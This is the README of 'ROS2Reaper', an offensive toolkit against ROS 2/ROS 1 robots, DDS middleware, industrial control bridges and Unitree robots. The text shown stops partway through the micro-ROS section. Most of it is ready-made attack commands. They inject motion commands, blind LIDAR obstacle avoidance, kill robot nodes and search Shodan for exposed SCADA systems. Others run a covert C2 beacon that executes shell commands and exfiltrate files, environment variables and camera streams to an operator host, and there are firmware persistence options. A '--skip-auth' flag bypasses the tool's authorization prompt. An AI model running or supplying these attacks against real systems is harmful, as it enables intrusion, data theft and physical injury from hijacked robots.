# ROS2Reaper

```
  ██████╗  ██████╗ ███████╗██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗
  ██╔══██╗██╔═══██╗██╔════╝╚════██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ██████╔╝██║   ██║███████╗ █████╔╝██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
  ██╔══██╗██║   ██║╚════██║██╔═══╝ ██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
  ██║  ██║╚██████╔╝███████║███████╗██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
  ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
```

**DDS/RTPS + ROS 1 + ICS/OT Bridge + Post-Exploitation C2 + micro-ROS/XRCE + Unitree Physical Robot Targeting Offensive Security Assessment Framework**

> Author: Gh057x | v0.6.0-alpha
> Targets: ROS 2 (Humble / Jazzy) · DDS (Fast DDS, Cyclone DDS, RTI Connext) · ROS 1 (Noetic / Melodic) · ICS/OT (Modbus, DNP3, OPC UA, MQTT, EtherCAT, AWS IoT) · micro-ROS (XRCE / DDS-XRCE, Arduino, STM32, ESP32, nRF52) · Unitree Robotics (Go2, G1, B2, B2W, H1, H2, A1, Go1)

---

## ⚠️ Legal Notice

```
╔══════════════════════════════════════════════════════════════════════╗
║  AUTHORIZED USE ONLY — MISUSE CAN CAUSE PHYSICAL HARM              ║
║  Only use on systems you own or have written authorization to test. ║
║  Robotic systems can cause injury. Ensure safety controls are in   ║
║  place before testing. Follow responsible disclosure practices.     ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

## Overview

ROS2Reaper is a modular offensive security toolkit for assessing ROS 2 and ROS 1 robotic deployments. It targets the underlying DDS/RTPS transport layer — the communication backbone of ROS 2 — as well as the legacy ROS 1 rosmaster XML-RPC interface.

The framework covers the full attack lifecycle — from initial recon to persistent post-exploitation and physical robot takeover:

| Phase | Description |
|-------|-------------|
| **Phase 1 — Reconnaissance** | Passive/active discovery, fingerprinting, enumeration, and security auditing |
| **Phase 2 — Exploitation** | Topic injection, node impersonation, RTPS amplification, and parameter manipulation |
| **Phase 3 — ICS/OT Bridge Analysis** | Attack surface analysis for DDS bridges to Modbus, DNP3, OPC UA, MQTT, EtherCAT, and AWS IoT Greengrass |
| **Phase 4 — Post-Exploitation / C2** | Covert command-and-control channel tunneled inside DDS/RTPS traffic, persistent beaconing, and data exfiltration |
| **Phase 5A — micro-ROS / XRCE** | XRCE Agent discovery, traffic profiling, client hijacking, implant generation, firmware persistence, and C2 dispatching for embedded micro-ROS targets |
| **Phase 5B — SROS2/DDS-Security** | DDS-Security handshake interception, X.509 certificate harvesting, governance/permissions policy analysis + forgery, and secured domain infiltration (downgrade / eavesdrop / impersonate) |
| **Phase 5C — Nav2 + ros2_control** | Navigation stack lifecycle attacks, costmap/sensor data poisoning, behavior tree hijacking, and ros2_control hardware interface exploitation |
| **Phase 6 — Edge AI / Perception** | AI inference service enumeration, adversarial perturbation generation + DDS injection, black-box model extraction, and ML model backdooring/swap |
| **Phase 7 — Physical Robot Targeting (Unitree)** | DDS-based recon, unauthenticated Sport API exploitation, direct LowCmd motor injection with CRC32-correct packets, and continuous sport mode hijacking across Unitree Go2/G1/B2/H1/H2/A1/Go1 |

---

## Project Structure

```
ros2reaper_framework/
├── ros2reaper.py          # Main entry point / CLI
├── ros2reaper_gui.py      # CustomTkinter GUI front-end
├── core/
│   ├── rtps_parser.py     # RTPS packet parser + DDS port calculator
│   ├── rtps_scanner.py    # SPDP probing, network scanning, passive listening
│   ├── ros1_master.py     # ROS1 rosmaster XML-RPC interface
│   └── ros1_transport.py  # TCPROS transport implementation
└── modules/
    ├── fingerprint.py         # DDS vendor/version/config fingerprinting
    ├── topic_enum.py          # ROS 2 topic/service/node enumeration
    ├── sros2_audit.py         # SROS2 security configuration auditing
    ├── topic_injection.py     # ROS 2 topic injection attacks
    ├── node_impersonation.py  # Node impersonation & TF poisoning
    ├── amplification.py       # RTPS amplification & robustness testing
    ├── rosbridge.py           # rosbridge WebSocket enumeration/injection/audit
    ├── ros1_enum.py           # ROS1 node/topic/param enumeration
    ├── ros1_injection.py      # ROS1 TCPROS topic injection
    ├── ros1_exploitation.py   # ROS1 node killing & parameter manipulation
    ├── ros1_audit.py          # ROS1 security configuration auditing
    ├── phase3/
    │   ├── ics_dds_enum.py        # ICS/OT context-aware DDS enumeration
    │   ├── modbus_dnp3_bridge.py  # Modbus/DNP3 ↔ DDS bridge analysis
    │   ├── mqtt_ethercat_bridge.py # MQTT/EtherCAT ↔ DDS bridge analysis
    │   ├── opcua_dds_bridge.py    # OPC UA ↔ DDS bridge analysis
    │   ├── aws_iot_bridge.py      # AWS IoT Greengrass ↔ DDS bridge analysis
    │   └── shodan_dds.py          # Internet-wide DDS exposure via Shodan
    ├── phase4/
    │   ├── c2_channel.py          # Covert DDS/RTPS C2 transport layer
    │   ├── c2_server.py           # Operator C2 server + interactive shell
    │   ├── c2_beacon.py           # Implant deployed on compromised ROS 2 hosts
    │   └── c2_exfil.py            # Chunked data exfiltration over covert channel
    ├── phase5a/
    │   ├── microros_agent.py      # XRCE Agent discovery & participant enumeration
    │   ├── xrce_traffic_analysis.py # XRCE traffic capture & behavioral profiling
    │   ├── microros_client_hijack.py # XRCE client spoofing & topic injection
    │   ├── microros_implant.py    # C2 implant source generator (C++/Arduino/Python)
    │   ├── microros_persistence.py # Firmware-level persistence mechanisms
    │   └── c2_dispatcher.py       # Operator C2 dispatcher for implants/agents
    ├── phase5b/
    │   ├── dds_security_interceptor.py # DDS-Security handshake intercept & token extraction
    │   ├── cert_harvester.py      # X.509 certificate harvesting, keystore enum & weakness scoring
    │   ├── policy_subverter.py    # Governance/permissions analysis, bypass & forgery
    │   └── domain_infiltrator.py  # Secured domain entry (downgrade/eavesdrop/impersonate)
    ├── phase5c/
    │   ├── nav2_lifecycle_attack.py   # Nav2 lifecycle state machine exploitation
    │   ├── costmap_poisoner.py        # Costmap / sensor data injection & service attacks
    │   ├── behavior_tree_hijacker.py  # BT goal cancellation, redirect, recovery loop, BT forge
    │   └── ros2_control_exploit.py    # ros2_control trajectory injection, controller switching
    ├── phase6/
    │   ├── ai_model_enumerator.py     # Triton/TF Serving/MLflow/ROS 2 AI service discovery
    │   ├── adversarial_perturbation.py # FGSM/PGD/UAP/patch generation + DDS topic injection
    │   ├── model_extractor.py         # Black-box model fingerprinting, timing side-channel
    │   └── model_poisoner.py          # Triton model swap, ONNX backdoor injection, param inject
    └── phase7/
        ├── unitree_recon.py           # DDS topic fingerprinting, model ID, vulnerability assessment
        ├── unitree_api_exploit.py     # Unauthenticated Sport API injection (39 command IDs)
        ├── unitree_lowcmd_injector.py # Direct LowCmd motor control with CRC32-correct 812-byte packets
        └── unitree_sport_hijacker.py  # Continuous high-frequency sport mode hijacking
```

---

## Installation

```bash
git clone https://github.com/r3tr0xCTF/ros2reaper_framework.git
cd ros2reaper_framework
pip install -r requirements.txt
```

> ROS 2 exploitation modules (`inject`, `impersonate`) require `rclpy` and a sourced ROS 2 environment. All Phase 1, Phase 3, and Phase 4 modules work with no ROS dependency.
>
> Phase 3 optional dependencies (all gracefully degraded if missing):
> ```bash
> pip install shodan paho-mqtt pymodbus requests asyncua
> ```
>
> Phase 4 has no additional dependencies — pure Python 3.8+ stdlib only.
>
> GUI requires [CustomTkinter](https://github.com/TomSchimansky/CustomTkinter):
> ```bash
> pip install customtkinter
> ```

---

## GUI

ROS2Reaper ships a full graphical front-end built on CustomTkinter. It wraps the CLI — no import-level coupling — so every command available from the terminal is accessible through the GUI.

```bash
python3 ros2reaper_gui.py
```

### Layout

| Pane | Description |
|------|-------------|
| **Sidebar** | Phase-grouped command list. Click to select a module. |
| **Target Bar** | Persistent target profile: IP, network, domain ID, namespace, `--skip-auth`, `--verbose`. Values are applied to the form on execute. Profiles can be saved/loaded/deleted. |
| **Center Form** | Dynamic argument form generated per command. All CLI flags exposed as typed widgets (text, numeric, bool, dropdown, file browser). Command preview updates live. |
| **Output Panel** | Tabbed terminal / JSON viewer. Terminal output is syntax-highlighted by line class (`[+]` green, `[!]` red, `[*]` yellow, headings bold). The JSON tab auto-extracts structured data from command output or `-o` files. |

### Features

- **Target Profiles** — save target IP / network / domain ID / namespace as named profiles under `.reaper_profiles/`. Switch between targets without re-entering connection details.
- **Session Save / Load** — export the current command + all form field values to a JSON file. Reload to resume where you left off.
- **Live Command Preview** — the exact CLI invocation is shown below the form and updates as you change fields. Copy to clipboard with one click.
- **Output Export** — export terminal output as `.txt` or parsed JSON data as `.json`.
- **Abort** — kill a running subprocess mid-execution.

### Supported Commands

The GUI exposes all framework modules across every phase:

| Phase | Modules |
|-------|---------|
| Phase 1 — Recon | `discover`, `fingerprint`, `portscan`, `listen`, `portcalc`, `enumerate`, `audit`, `full` |
| Phase 2 — Exploit | `inject`, `impersonate`, `amplify` |
| ROS 1 | `ros1-discover`, `ros1-inject`, `ros1-exploit`, `ros1-audit` |
| rosbridge | `rb-enum`, `rb-inject`, `rb-audit` |
| Phase 3 — ICS/OT | `ics-enum`, `modbus-scan`, `mqtt-scan`, `opcua-scan`, `aws-scan`, `shodan-dds` |
| Phase 4 — C2 | `c2-server`, `c2-beacon`, `c2-exfil`, `c2-recv` |
| Phase 5A — micro-ROS | `microros-agent`, `xrce-traffic`, `xrce-hijack`, `uros-implant`, `uros-persist`, `uros-c2` |
| Phase 5B — SROS2 | `sros2-intercept`, `sros2-harvest`, `sros2-policy`, `sros2-infiltrate` |
| Phase 5C — Nav2/Ctrl | `nav2-lifecycle`, `nav2-costmap`, `nav2-bt`, `ros2ctrl-exploit` |
| Phase 6 — Edge AI | `ai-enum`, `ai-perturb`, `ai-extract`, `ai-poison` |
| Phase 7 — Unitree | `unitree-recon`, `unitree-api`, `unitree-lowcmd`, `unitree-sport` |

---

## CLI Usage

```
python3 ros2reaper.py <command> [options]
```

### Global Options

| Flag | Description |
|------|-------------|
| `-t`, `--target` | Target IP address |
| `-n`, `--network` | Target network in CIDR notation |
| `-d`, `--domain-id` | DDS Domain ID (default: 0) |
| `--timeout` | Probe timeout in seconds (default: 3.0) |
| `--duration` | Listen/attack duration in seconds (default: 30.0) |
| `-o`, `--output` | Save results to JSON file |
| `-v`, `--verbose` | Verbose output |
| `--skip-auth` | Skip authorization prompt (for scripting) |
| `--no-banner` | Suppress ASCII banner |

**Phase 3 options:**

| Flag | Description |
|------|-------------|
| `--threads` | Concurrent scan threads (default: 50) |
| `--deep` | Enable deep probing / protocol coexistence detection |
| `--context` | ICS sector bias: `scada`, `atc`, `automotive`, `smart_grid`, `military`, `medical`, `iiot` |
| `--passive` | Passive multicast listener mode — no probes sent (`ics-enum`) |
| `--passive-duration` | Passive listen duration in seconds (default: 30.0) |
| `--modbus-enumerate` | Enumerate Modbus unit IDs and test write access |
| `--mqtt-enumerate` | Full MQTT wildcard topic enumeration (requires `paho-mqtt`) |
| `--enum-duration` | MQTT topic listen duration in seconds (default: 10.0) |
| `--enumerate-nodes` | Browse OPC UA address space for DDS bridge indicators |
| `--shadow-enumerate` | Probe AWS IoT Shadow/Jobs topics on discovered brokers |
| `--api-key` | Shodan API key (or set env `SHODAN_API_KEY`) |
| `--limit` | Max Shodan results per query (default: 100) |
| `--rate` | Seconds between Shodan API calls (default: 1.0) |
| `--export` | Export discovered IP list from Shodan results to file |

---

## Phase 1 — Reconnaissance

### `discover` — DDS Participant Discovery

Sends SPDP (Simple Participant Discovery Protocol) probes to identify DDS participants on the network.

```bash
# Multicast probe on local network
python3 ros2reaper.py discover

# Single target
python3 ros2reaper.py discover --target 192.168.1.100

# Full network sweep
python3 ros2reaper.py discover --network 192.168.1.0/24 -o discovered.json
```

---

### `fingerprint` — DDS Vendor / Version Identification

Fingerprints discovered participants to identify DDS implementation, RMW layer, ROS 2 distro, OS hints, deployment type, and security posture.

```bash
python3 ros2reaper.py fingerprint --target 192.168.1.100
python3 ros2reaper.py fingerprint --network 192.168.1.0/24 -o fingerprints.json
```

Output includes:
- DDS vendor (Fast DDS, Cyclone DDS, RTI Connext, etc.)
- RMW implementation and ROS 2 distribution
- Node name and deployment type
- OS hint
- Security status — DDS Security / SROS2 enabled or disabled
- Risk factors with severity (CRITICAL / HIGH / MEDIUM / LOW)

---

### `portscan` — DDS Port Discovery

Scans for open DDS-specific UDP ports derived from domain IDs. Identifies discovery and user data channels per participant.

```bash
python3 ros2reaper.py portscan --target 192.168.1.100 --domains 0-10
python3 ros2reaper.py portscan --network 192.168.1.0/24 --domains 0,1,5
```

---

### `portcalc` — DDS Port Calculator

Calculates expected DDS port numbers for given domain IDs without sending any traffic.

```bash
python3 ros2reaper.py portcalc --domains 0-15
python3 ros2reaper.py portcalc --domains 0,1,42 -v
```

```
  Domain | Disc MC | Disc UC | User MC | User UC
-------------------------------------------------------
       0 |    7400 |    7410 |    7401 |    7411
       1 |    7650 |    7660 |    7651 |    7661
```

---

### `listen` — Passive RTPS Traffic Capture

Listens passively on DDS multicast groups. Zero packets sent — full stealth mode.

```bash
python3 ros2reaper.py listen --domain-id 0 --duration 60
python3 ros2reaper.py listen --domain-id 0 --duration 120 -o captured.json
```

---

### `enumerate` — ROS 2 Graph Enumeration

Enumerates the full ROS 2 compute graph: topics, services, nodes, publishers, and subscribers.

```bash
python3 ros2reaper.py enumerate --target 192.168.1.100
python3 ros2reaper.py enumerate --domain-id 5 -o graph.json
```

---

### `audit` — SROS2 Security Configuration Audit

Audits the security posture of discovered participants: checks for disabled encryption, missing access control, insecure QoS policies, and unauthenticated endpoints.

```bash
python3 ros2reaper.py audit --target 192.168.1.100
python3 ros2reaper.py audit --network 192.168.1.0/24 -o audit.json
```

---

### `full` — Complete Assessment

Runs all Phase 1 modules sequentially (discovery → fingerprinting → port scan) and produces a single consolidated JSON report.

```bash
python3 ros2reaper.py full --network 192.168.1.0/24 -o full_report.json
python3 ros2reaper.py full --target 192.168.1.100 --domain-id 0 -v
```

---

## Phase 2 — Exploitation (ROS 2)

> Requires a sourced ROS 2 environment and `rclpy`. Run from an attacker container or a ROS 2-capable host.

### `inject` — Topic Message Injection

Injects malicious messages onto ROS 2 topics across multiple attack modes.

| Mode | Description |
|------|-------------|
| `cmd_vel` | Velocity command injection — presets: `spin`, `fullspeed`, `reverse`, `erratic`, `estop`, `circle` |
| `lidar` | LIDAR scan spoofing — modes: `allclear`, `wall`, `phantom` |
| `nav` | Navigation goal hijacking — send robot to arbitrary coordinates |
| `odom` | Odometry spoofing — corrupt pose estimation pipeline |
| `swarm` | Multi-robot convergence attack — drive an entire fleet to one point |

```bash
# Spin the robot
python3 ros2reaper.py inject --namespace /robot1 --preset spin --duration 10

# Full speed injection
python3 ros2reaper.py inject --namespace /robot1 --preset fullspeed --duration 5

# Blind LIDAR — inject clear-path data to suppress obstacle avoidance
python3 ros2reaper.py inject --attack-mode lidar --namespace /robot1 --lidar-mode allclear --duration 30

# Navigation goal hijack
python3 ros2reaper.py inject --attack-mode nav --namespace /robot1 --x 10 --y 5 --duration 20

# Odometry corruption
python3 ros2reaper.py inject --attack-mode odom --namespace /robot1 --duration 15

# Swarm convergence
python3 ros2reaper.py inject --attack-mode swarm --namespaces /robot1 /robot2 /robot3 --x 5 --y 5 --duration 30
```

---

### `impersonate` — Node Impersonation

Impersonates existing ROS 2 nodes to inject data, corrupt the TF tree, flood topics, or saturate the DDS bus with fake participants.

| Mode | Description |
|------|-------------|
| `shadow` | Shadow publisher — mirror a target node's topic output with attacker-controlled data |
| `tf` | TF tree poisoning — inject corrupt coordinate frame transforms |
| `dos` | Topic flooding — saturate a node's subscriptions |
| `sybil` | Sybil attack — spawn N fake DDS participants |

```bash
# Shadow publisher
python3 ros2reaper.py impersonate --attack-mode shadow --target-node robot_controller --namespace /robot1 --duration 30

# TF poisoning
python3 ros2reaper.py impersonate --attack-mode tf --target-node fake_robot_1 --namespace /robot1 --duration 20

# Topic DoS
python3 ros2reaper.py impersonate --attack-mode dos --namespace /robot1 --duration 10

# Sybil (20 fake participants)
python3 ros2reaper.py impersonate --attack-mode sybil --namespace /robot1 --count 20 --duration 30
```

---

### `amplify` — RTPS Amplification & Robustness Testing

Tests DDS implementations for amplification vulnerabilities and protocol robustness at the raw RTPS level. No ROS 2 installation required.

| Mode | Description |
|------|-------------|
| `full_suite` | Run all robustness tests sequentially |
| `reflect` | SPDP reflection / amplification measurement |
| `exhaust` | Participant exhaustion via GUID flooding |
| `fuzz` | Malformed RTPS packet fuzzing |
| `heartbeat` | Heartbeat amplification test |

```bash
# Full suite
python3 ros2reaper.py amplify --target 192.168.1.100 --attack-mode full_suite

# Participant exhaustion
python3 ros2reaper.py amplify --target 192.168.1.100 --attack-mode exhaust --count 500

# Protocol fuzzing
python3 ros2reaper.py amplify --target 192.168.1.100 --attack-mode fuzz --domain-id 0
```

---

## ROS 1 Modules

Targets legacy ROS 1 deployments via the rosmaster XML-RPC API and TCPROS protocol.

### `ros1-discover` — Enumeration

Enumerates all nodes, topics, services, and parameters from a rosmaster.

```bash
python3 ros2reaper.py ros1-discover --target 192.168.1.10 --skip-auth
python3 ros2reaper.py ros1-discover --target 192.168.1.10 --ros1-port 11311 -v -o ros1_enum.json
```

---

### `ros1-audit` — Security Audit

Audits a ROS1 deployment for misconfigurations: unauthenticated master, security-critical topic exposure, EOL distros, and exposed parameter server.

```bash
python3 ros2reaper.py ros1-audit --target 192.168.1.10 --skip-auth -o ros1_audit.json
```

---

### `ros1-inject` — Topic Injection

Injects messages into ROS1 topics via TCPROS without being a registered node.

```bash
# cmd_vel spinout
python3 ros2reaper.py ros1-inject --target 192.168.1.10 --topic /cmd_vel --preset spinout --duration 10 --skip-auth

# LIDAR blind injection
python3 ros2reaper.py ros1-inject --target 192.168.1.10 --attack-mode lidar --topic /scan --duration 10 --skip-auth
```

---

### `ros1-exploit` — Node Kill / Parameter Manipulation

Kills ROS1 nodes and reads, writes, or deletes parameter server values.

```bash
# Kill a specific node
python3 ros2reaper.py ros1-exploit --target 192.168.1.10 --node /turtlesim --skip-auth

# Kill all nodes
python3 ros2reaper.py ros1-exploit --target 192.168.1.10 --kill-all --skip-auth

# Write a parameter
python3 ros2reaper.py ros1-exploit --target 192.168.1.10 --param-key /max_speed --param-value 0.1 --skip-auth

# Dump all parameters
python3 ros2reaper.py ros1-exploit --target 192.168.1.10 --skip-auth
```

---

## Phase 3 — ICS/OT Bridge Analysis

> No ROS installation required. All modules operate at the raw socket/TCP level.

Phase 3 targets environments where DDS/ROS 2 is bridged to industrial control system protocols. Each module discovers protocol co-existence, maps the bridge attack surface, and generates scored attack scenarios with CVSS ratings.

---

### `ics-enum` — ICS/OT Context-Aware DDS Enumeration

Classifies DDS deployments operating in non-robotics ICS/OT contexts: SCADA, air traffic control, automotive, smart grid, military, medical, and IIoT. Performs passive multicast listening or active SPDP probing with Bayesian context inference.

```bash
# Active scan — single target, SCADA context
python3 ros2reaper.py ics-enum --target 10.0.0.1 --deep --context scada --skip-auth

# Network sweep
python3 ros2reaper.py ics-enum --network 10.0.0.0/24 --deep -o ics.json --skip-auth

# Passive mode — no packets sent (stealth)
python3 ros2reaper.py ics-enum --passive --passive-duration 60 --skip-auth
```

---

### `modbus-scan` — Modbus/DNP3 ↔ DDS Bridge Analysis

Detects hosts running DDS alongside Modbus TCP (legacy SCADA) or DNP3 (power grid protocols). Maps bridge attack surface with scored scenarios including coil/register write injection, historian poisoning, and alarm suppression (max CVSS 9.8).

```bash
python3 ros2reaper.py modbus-scan --target 10.0.0.1 --deep --modbus-enumerate --skip-auth
python3 ros2reaper.py modbus-scan --network 10.0.0.0/24 -o modbus.json --skip-auth
```

---

### `mqtt-scan` — MQTT/EtherCAT ↔ DDS Bridge Analysis

Detects DDS alongside MQTT (IIoT edge-cloud) or EtherCAT (real-time fieldbus). Enumerates MQTT topics via wildcard subscription, parses Sparkplug B payloads, detects known bridge products (RTI, Zenoh, EMQX, Azure IoT Edge), and maps PDO data poisoning and topic injection scenarios (max CVSS 9.8).

```bash
python3 ros2reaper.py mqtt-scan --target 10.0.0.1 --deep --mqtt-enumerate --skip-auth
python3 ros2reaper.py mqtt-scan --network 10.0.0.0/24 -o mqtt.json --skip-auth
```

---

### `opcua-scan` — OPC UA ↔ DDS Bridge Analysis

Detects hosts with both DDS and OPC UA (the dominant ICS data exchange standard). Probes OPC UA endpoints via raw TCP HEL/ACK, enumerates security modes, identifies vendor namespaces (Kepware, OSIsoft PI, Ignition, WinCC, FactoryTalk, etc.), and scores bridge attack scenarios including setpoint injection, alarm suppression, and historian poisoning (max CVSS 9.1).

```bash
python3 ros2reaper.py opcua-scan --target 10.0.0.1 --deep --enumerate-nodes --skip-auth
python3 ros2reaper.py opcua-scan --network 10.0.0.0/24 -o opcua.json --skip-auth
```

---

### `aws-scan` — AWS IoT Greengrass ↔ DDS Bridge Analysis

Detects AWS IoT Greengrass v2 co-located with DDS. Fingerprints Greengrass via DDS participant properties, IPC socket paths, and X.509 Thing ARN exfiltration in SPDP discovery traffic. Maps pivot paths from DDS to AWS cloud via IAM role abuse, Shadow manipulation, and OTA command injection (max CVSS 10.0).

```bash
python3 ros2reaper.py aws-scan --target 10.0.0.1 --deep --shadow-enumerate --skip-auth
python3 ros2reaper.py aws-scan --network 10.0.0.0/24 -o aws.json --skip-auth
```

---

### `shodan-dds` — Internet-Wide DDS Exposure via Shodan

Queries the Shodan API for internet-exposed DDS/RTPS endpoints. Classifies results by ICS sector, DDS vendor, security posture, and domain ID. Exports target IP lists for direct feeding into `ics-enum` and other Phase 3 modules.

```bash
# Full search campaign
python3 ros2reaper.py shodan-dds --api-key YOUR_KEY --context scada -o shodan.json --skip-auth

# Single host deep lookup
python3 ros2reaper.py shodan-dds --api-key YOUR_KEY --target 1.2.3.4 --skip-auth

# Export IP list for ics-enum pipeline
python3 ros2reaper.py shodan-dds --api-key YOUR_KEY --export targets.txt --skip-auth
```

> Set `SHODAN_API_KEY` in your environment to avoid passing `--api-key` on every command.

---

### Phase 3 Pipeline

Full ICS/OT assessment workflow:

```bash
# 1. Internet recon — find exposed DDS endpoints
python3 ros2reaper.py shodan-dds --api-key $SHODAN_API_KEY --export targets.txt --skip-auth

# 2. ICS context classification
python3 ros2reaper.py ics-enum --network 10.0.0.0/24 --deep -o ics.json --skip-auth

# 3. Protocol bridge enumeration (run in parallel)
python3 ros2reaper.py modbus-scan --network 10.0.0.0/24 --deep -o modbus.json --skip-auth
python3 ros2reaper.py mqtt-scan   --network 10.0.0.0/24 --deep -o mqtt.json   --skip-auth
python3 ros2reaper.py opcua-scan  --network 10.0.0.0/24 --deep -o opcua.json  --skip-auth
python3 ros2reaper.py aws-scan    --network 10.0.0.0/24 --deep -o aws.json    --skip-auth
```

---

---

## Phase 4 — Post-Exploitation / C2

> No ROS 2 installation required on the operator side. All modules operate at raw UDP/RTPS level. The beacon side requires Python 3.8+ on the compromised host.

Phase 4 implements a covert command-and-control channel tunneled inside legitimate DDS/RTPS traffic. C2 packets are XOR-encoded and embedded in standard RTPS DATA submessages that mimic normal ROS 2 infrastructure topics (`/rosout`, `/diagnostics`, `/parameter_events`). The channel is invisible to network monitors that don't perform deep RTPS inspection.

**Architecture:**

```
Operator Machine                     Compromised ROS 2 Host
┌─────────────┐   covert DDS/RTPS   ┌──────────────────────┐
│  c2-server  │ ◄──────────────────► │     c2-beacon        │
│ (operator   │     disguised as     │  (implant, checks in │
│   shell)    │   /rosout traffic    │   every N seconds)   │
└─────────────┘                      └──────────────────────┘
```

**Covert channel design:**
- Payloads XOR-encoded and wrapped in valid RTPS DATA submessages
- GUID prefix rotated per session — no persistent fingerprint
- Beacon interval jittered ±25% to defeat timing analysis
- Masquerades as eProsima Fast DDS (most common ROS 2 middleware)

---

### `c2-server` — Operator C2 Server

Listens for beacon check-ins, tracks active sessions, and provides an interactive shell for tasking.

```bash
# Start C2 server on domain 0
python3 ros2reaper.py c2-server --domain-id 0 --skip-auth

# With custom key and session export on exit
python3 ros2reaper.py c2-server --domain-id 0 --c2-key mysecretkey -o c2_report.json --skip-auth
```

**Interactive shell commands:**

```
sessions                      List all active sessions
use <session_id>              Set active session (partial ID match)
info                          Show active session details
results                       Show task results for active session

task shell <cmd>              Run shell command on compromised host
task sysinfo                  Collect hostname, OS, ROS env info
task ros_enum                 Enumerate ROS 2 nodes/topics/params
task topic_read <topic>       Read messages from a ROS topic

kill                          Send KILL signal — terminate the beacon
export <file.json>            Export all sessions and results to JSON
exit                          Stop server
```

---

### `c2-beacon` — Implant / Beacon

Deployed on a compromised ROS 2 host after initial access. Checks in with the C2 server at a jittered interval, delivers task results, and receives new tasking.

```bash
# Basic beacon — check in every 30s
python3 ros2reaper.py c2-beacon --target <c2_server_ip> --skip-auth

# Custom interval + TTL (self-terminate after 20 check-ins)
python3 ros2reaper.py c2-beacon --target <c2_server_ip> --c2-interval 20 --c2-ttl 20 --skip-auth

# Custom encryption key (must match server)
python3 ros2reaper.py c2-beacon --target <c2_server_ip> --c2-key mysecretkey --skip-auth
```

Supported tasks (delivered from `c2-server`):

| Task | Description |
|------|-------------|
| `shell` | Execute arbitrary shell command, return stdout/stderr |
| `sysinfo` | Collect hostname, user, PID, ROS distro, domain ID |
| `ros_enum` | Enumerate ROS 2 nodes, topics, and parameters via CLI |
| `topic_read` | Read messages from a specified ROS 2 topic |

---

### `c2-exfil` — Data Exfiltration

Collects data on the compromised host and streams it to the C2 server via chunked EXFIL packets over the covert channel. Large payloads are automatically split into 1400-byte chunks (stays within UDP MTU) and reassembled on the operator side.

```bash
# Exfiltrate environment variables
python3 ros2reaper.py c2-exfil --target <c2_server_ip> --exfil-mode env --skip-auth

# Exfiltrate a file from the target filesystem
python3 ros2reaper.py c2-exfil --target <c2_server_ip> --exfil-mode files --exfil-path /etc/hosts --skip-auth

# Dump all ROS 2 parameter values
python3 ros2reaper.py c2-exfil --target <c2_server_ip> --exfil-mode params --skip-auth

# Capture and exfiltrate a ROS topic stream
python3 ros2reaper.py c2-exfil --target <c2_server_ip> --exfil-mode topic --topic /camera/image_raw --skip-auth
```

Exfil modes:

| Mode | Description |
|------|-------------|
| `env` | All environment variables and ROS configuration |
| `files` | Read a file from the target filesystem (up to 64KB) |
| `params` | Dump all ROS 2 parameter values across all nodes |
| `topic` | Capture and stream a ROS 2 topic for 10 seconds |

---

### `c2-recv` — Exfil Receiver

Listens on the operator side and reassembles chunked exfil data from a specific session.

```bash
# Receive exfil and print to stdout
python3 ros2reaper.py c2-recv --c2-session <session_id> --skip-auth

# Save to file
python3 ros2reaper.py c2-recv --c2-session <session_id> -o stolen_data.bin --skip-auth

# Longer timeout for large payloads
python3 ros2reaper.py c2-recv --c2-session <session_id> --timeout 120 -o output.txt --skip-auth

---

## Phase 5A — micro-ROS / XRCE

> No ROS installation required. All Phase 5A modules operate at the raw UDP/socket level using the XRCE wire format.

Phase 5A targets embedded micro-ROS deployments — constrained MCU-based nodes (Arduino, STM32, ESP32, nRF52) that communicate via the DDS-XRCE (eXtremely Resource Constrained Environments) protocol through a micro-ROS Agent bridge.

**XRCE default ports:** UDP/8888 (standard), UDP/7400–7409 (alternative instances)

**Phase 5A options:**

| Flag | Description |
|------|-------------|
| `--agent-port` | XRCE Agent UDP port (default: 8888) |
| `--xrce-multiport` | Scan common XRCE ports (8888, 7400–7409) |
| `--xrce-enumerate` | Enumerate micro-ROS participants on discovered agents |
| `--xrce-attack` | Hijack attack type: `twist`, `nav`, `raw` |
| `--xrce-session` | Spoofed session ID in hex (default: 0x42) |
| `--pcap` | Export captured XRCE traffic to PCAP file |
| `--theta` | Nav goal orientation in radians (default: 0.0) |
| `--interval` | Delay between injections in seconds (default: 0.1) |
| `--payload-file` | Raw XRCE payload file (hex text) for raw injection |
| `--payload-hex` | Raw XRCE payload as hex string |
| `--platform` | Implant platform: `cpp`, `arduino`, `python` |
| `--implant-id` | Implant ID (auto-generated if omitted) |
| `--beacon-interval` | Implant beacon interval in ms (default: 5000) |
| `--beacon-topic` | Beacon topic base (default: `/implant/beacon`) |
| `--command-topic` | Command topic base (default: `/implant/command`) |
| `--obfuscate` | Strip comments from generated implant source |
| `--add-decoy` | Add decoy code to generated implant |
| `--manifest` | Export implant generation manifest to JSON |
| `--persist-method` | Persistence method: `library_patch`, `bootloader`, `firmware_inject`, `partition`, `ota_hijack` |
| `--implant-file` | Binary file with implant shellcode for persistence |
| `--implant-hex` | Implant shellcode as hex string |
| `--hook-address` | Bootloader hook address (hex, e.g. `0x08000100`) |
| `--partition-name` | Partition name for ESP32 partition hijack |
| `--ota-server` | OTA server for hijack config generation |
| `--dispatcher-port` | Phase 5A dispatcher callback port |
| `--beacon-timeout` | Implant beacon timeout in seconds (default: 60.0) |
| `--log-file` | Dispatcher log file path |
| `--export-session` | Export dispatcher session state to JSON |
| `--batch-file` | Run dispatcher commands from file (non-interactive) |

---

### `microros-agent` — XRCE Agent Discovery & Enumeration

Probes for XRCE Agents using minimal HEARTBEAT packets and fingerprints vendor/version from responses. Optionally enumerates connected micro-ROS participants (MCU clients).

```bash
# Single target
python3 ros2reaper.py microros-agent --target 10.0.0.5 --skip-auth

# Network sweep
python3 ros2reaper.py microros-agent --network 10.0.0.0/24 --skip-auth -o agents.json

# Scan all common XRCE ports on a single host
python3 ros2reaper.py microros-agent --target 10.0.0.5 --xrce-multiport --skip-auth

# Discover agents + enumerate connected MCU participants
python3 ros2reaper.py microros-agent --target 10.0.0.5 --xrce-enumerate --skip-auth

# Custom XRCE port
